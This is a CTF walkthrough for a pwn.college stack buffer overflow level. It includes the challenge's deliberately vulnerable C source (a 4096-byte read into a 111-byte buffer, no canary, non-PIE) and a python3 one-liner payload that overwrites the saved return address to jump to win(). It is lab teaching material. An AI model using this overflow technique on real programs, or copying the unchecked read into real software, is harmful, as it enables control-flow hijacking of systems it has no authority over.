# Stage 09: Control Hijack (Easy) — CTF Walkthrough

## Module Metadata

| Field | Value |
|-------|-------|
| **Module Name** | Pwn.College — Binary Exploitation |
| **Level** | Easy |
| **Estimated Time** | — |
| **Category** | Binary Exploitation / Reversing |
| **Platform** | Linux x86-64 |
| **Binary** | `binary-exploitation-control-hijack-w` |
| **VT Score** | N/A |

---

## Challenge

`/challenge/binary-exploitation-control-hijack-w`. Return-address hijack: 136 bytes of `A` padding followed by the 8-byte little-endian address `0x0000000000401851`, redirecting control flow to that address. The 111-byte buffer plus the locals and saved frame pointer put the return address at offset 136; the program prints the exact offset and `win()` address when it runs.

## Source

The challenge ships its source at `/challenge/binary-exploitation-control-hijack-w.c`. There is no win variable to flip this time; the goal is to replace the function's saved return address:

- **`challenge()`** reserves a 111-byte `input` buffer. The saved return address sits 136 bytes after the start of that buffer.
- **`read(0, &data.input, 4096)`** lets you write far past the buffer, through the saved frame pointer, and into the saved return address.
- **The program prints the exact offset and the address of `win()`** before it reads your payload. `win()` is the function that opens `/flag`.
- **The last 8 bytes of the payload replace the return address** with that address, written little-endian (backwards).

So the exploit is: 136 bytes of padding, then the 8-byte address of `win()`. The highlighted lines show the buffer, the read, the offset leak, and the `win()` address.

```c title="binary-exploitation-control-hijack-w.c" keys="67,99,122,146,153"
#define _GNU_SOURCE 1

#include <stdlib.h>
#include <stdint.h>
#include <stdbool.h>
#include <stdio.h>
#include <unistd.h>
#include <fcntl.h>
#include <string.h>
#include <time.h>
#include <errno.h>
#include <assert.h>
#include <libgen.h>
#include <sys/types.h>
#include <sys/stat.h>
#include <sys/socket.h>
#include <sys/wait.h>
#include <sys/signal.h>
#include <sys/mman.h>
#include <sys/ioctl.h>
#include <sys/sendfile.h>
#include <sys/prctl.h>
#include <sys/personality.h>
#include <arpa/inet.h>

uint64_t sp_;
uint64_t bp_;
uint64_t sz_;
uint64_t cp_;
uint64_t cv_;
uint64_t si_;
uint64_t rp_;

#define GET_SP(sp) asm volatile ("mov %0, rsp" : "=r"(sp) : : );
#define GET_BP(bp) asm volatile ("mov %0, rbp" : "=r"(bp) : : );
#define GET_CANARY(cn) asm volatile ("mov %0, QWORD PTR [fs:0x28]" : "=r"(cn) : : );
#define GET_FRAME_WORDS(sz_, sp, bp, rp_) GET_SP(sp); GET_BP(bp); sz_ = (bp-sp)/8+2; rp_ = bp+8;
#define FIND_CANARY(cnp, cv, start)                                     \
  {                                                                     \
    cnp = start;                                                        \
    GET_CANARY(cv);                                                     \
    while (*(uint64_t *)cnp != cv) cnp = (uint64_t)cnp - 8;   \
  }

void DUMP_STACK(uint64_t sp, uint64_t n)
{
    printf("+---------------------------------+-------------------------+--------------------+\n");
    printf("| %31s | %23s | %18s |\n", "Stack location", "Data (bytes)", "Data (LE int)");
    printf("+---------------------------------+-------------------------+--------------------+\n");
    for (si_ = 0; si_ < n; si_++)
    {
        printf("| 0x%016lx (rsp+0x%04x) | %02x %02x %02x %02x %02x %02x %02x %02x | 0x%016lx |\n",
               sp+8*si_, 8*si_,
               *(uint8_t *)(sp+8*si_+0), *(uint8_t *)(sp+8*si_+1), *(uint8_t *)(sp+8*si_+2), *(uint8_t *)(sp+8*si_+3),
               *(uint8_t *)(sp+8*si_+4), *(uint8_t *)(sp+8*si_+5), *(uint8_t *)(sp+8*si_+6), *(uint8_t *)(sp+8*si_+7),
               *(uint64_t *)(sp+8*si_)
              );
    }
    printf("+---------------------------------+-------------------------+--------------------+\n");
}

void bin_padding()
{
    asm volatile (".rept 3602; nop; .endr");
}

void win()
{
    static char flag[256];
    static int flag_fd;
    static int flag_length;

    puts("You win! Here is your flag:");
    flag_fd = open("/flag", 0);
    if (flag_fd < 0)
    {
        printf("\n  ERROR: Failed to open the flag -- %s!\n", strerror(errno));
        if (geteuid() != 0)
        {
            printf("  Your effective user id is not 0!\n");
            printf("  You must directly run the suid binary in order to have the correct permissions!\n");
        }
        exit(-1);
    }
    flag_length = read(flag_fd, flag, sizeof(flag));
    if (flag_length <= 0)
    {
        printf("\n  ERROR: Failed to read the flag -- %s!\n", strerror(errno));
        exit(-1);
    }
    write(1, flag, flag_length);
    printf("\n\n");
}

int challenge(int argc, char **argv, char **envp)
{
    struct
    {
        char input[111];
    } data  = {0} ;

    unsigned long size = 0;

    puts("The challenge() function has just been launched!");

    GET_FRAME_WORDS(sz_, sp_, bp_, rp_);
    puts("Before we do anything, let's take a look at challenge()'s stack frame:");
    DUMP_STACK(sp_, sz_);
    printf("Our stack pointer points to %p, and our base pointer points to %p.\n", sp_, bp_);
    printf("This means that we have (decimal) %d 8-byte words in our stack frame,\n", sz_);
    printf("including the saved base pointer and the saved return address, for a\n");
    printf("total of %d bytes.\n", sz_ * 8);
    printf("The input buffer begins at %p, partway through the stack frame,\n", &data.input);
    printf("(\"above\" it in the stack are other local variables used by the function).\n");
    printf("Your input will be read into this buffer.\n");
    printf("The buffer is %d bytes long, but the program will let you provide an arbitrarily\n", 111);
    printf("large input length, and thus overflow the buffer.\n\n");

    printf("In this level, there is no \"win\" variable.\n");
    printf("You will need to force the program to execute the win() function\n");
    printf("by directly overflowing into the stored return address back to main,\n");
    printf("which is stored at %p, %d bytes after the start of your input buffer.\n", rp_, rp_ - (unsigned long) &data.input);
    printf("That means that you will need to input at least %d bytes (%d to fill the buffer,\n", rp_ + 8 - (unsigned long) &data.input, 111);
    printf("%d to fill other stuff stored between the buffer and the return address,\n", rp_ - (unsigned long) &data.input - 111);
    printf("and 8 that will overwrite the return address).\n\n");

    puts("We have disabled the following standard memory corruption mitigations for this challenge:");
    puts("- the canary is disabled, otherwise you would corrupt it before");
    puts("overwriting the return address, and the program would abort.");
    puts("- the binary is *not* position independent. This means that it will be");
    puts("located at the same spot every time it is run, which means that by");
    puts("analyzing the binary (using objdump or reading this output), you can");
    puts("know the exact value that you need to overwrite the return address with.\n");

    size = 4096;

    printf("You have chosen to send %lu bytes of input!\n", size);
    printf("This will allow you to write from %p (the start of the input buffer)\n", &data.input);
    printf("right up to (but not including) %p (which is %d bytes beyond the end of the buffer).\n", size + (unsigned long) &data.input, size - 111);

    printf("Of these, you will overwrite %d bytes into the return address.\n", (long)((unsigned long) &data.input + size - rp_));
    printf("If that number is greater than 8, you will overwrite the entire return address.\n\n");

    printf("You will want to overwrite the return value from challenge()\n");
    printf("(located at %p, %d bytes past the start of the input buffer)\n", rp_, rp_ - (unsigned long) &data.input);
    printf("with %p, which is the address of the win() function.\n", win);
    printf("This will cause challenge() to return directly into the win() function,\n");
    printf("which will in turn give you the flag.\n");
    printf("Keep in mind that you will need to write the address of the win() function\n");
    printf("in little-endian (bytes backwards) so that it is interpreted properly.\n\n");

    printf("Send your payload (up to %lu bytes)!\n", size);
    int received = read(0, &data.input, (unsigned long) size);

    if (received < 0)
    {
        printf("ERROR: Failed to read input -- %s!\n", strerror(errno));
        exit(1);
    }

    printf("You sent %d bytes!\n", received);

    printf("Let's see what happened with the stack:\n\n");
    DUMP_STACK(sp_, sz_);

    printf("The program's memory status:\n");
    printf("- the input buffer starts at %p\n", &data.input);
    printf("- the saved frame pointer (of main) is at %p\n", bp_);
    printf("- the saved return address (previously to main) is at %p\n", rp_);
    printf("- the saved return address is now pointing to %p.\n", *(unsigned long*)(rp_));
    printf("- the address of win() is %p.\n", win);
    printf("\n");

    printf("If you have managed to overwrite the return address with the correct value,\n");
    printf("challenge() will jump straight to win() when it returns.\n");
    printf("Let's try it now!\n\n", 0);

    puts("Goodbye!");

    return 0;
}

int main(int argc, char **argv, char **envp)
{
    setvbuf(stdin, NULL, _IONBF, 0);
    setvbuf(stdout, NULL, _IONBF, 0);

    char crash_resistance[0x1000];

    challenge(argc, argv, envp);

}
```

## Solution

```bash
python3 -c "print('A' * 136 + '\x51\x18\x40\x00\x00\x00\x00\x00', end='')" | ./binary-exploitation-control-hijack-w
```

The program prints the offset and the exact `win()` address before it reads your payload. If your run prints a different address, use that one in place of `0x401851`, written little-endian.
